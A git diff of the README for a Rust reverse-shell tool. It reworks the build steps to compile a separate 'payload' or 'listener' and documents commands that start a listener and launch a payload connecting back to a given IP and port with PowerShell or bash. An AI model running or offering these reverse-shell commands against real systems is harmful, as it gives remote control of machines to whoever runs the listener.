@@ -10,26 +10,18 @@
 ```rustup target add x86_64-unknown-linux-gnu && cargo install cross```
 
 # Compilation
-- Linux for Linux :
+- Linux for Linux or Windows for Windows :
 
-``` cargo build ```
-
-- Windows for Windows:
-
-``` cargo build ```
+```cargo build --features <payload|listener>```
 
 - Linux for Windows :
 
-```cross build --target x86_64-pc-windows-gnu --release```
-
-- Windows for Linux :
-
-```cargo build --target x86_64-unknown-linux-gnu --release```
+```cross build --target x86_64-pc-windows-gnu --release --features <payload|listener>```
 
 # Usage
-``` ./revshell <IP> <PORT> <powershell|bash> ```
 
-# ToDo
-- Add Linux support
-- Split function in multiple files
-- Encryption
+## Listener
+```./listener <PORT>```
+
+## Payload
+```./payload <IP> <PORT> <powershell|bash>```
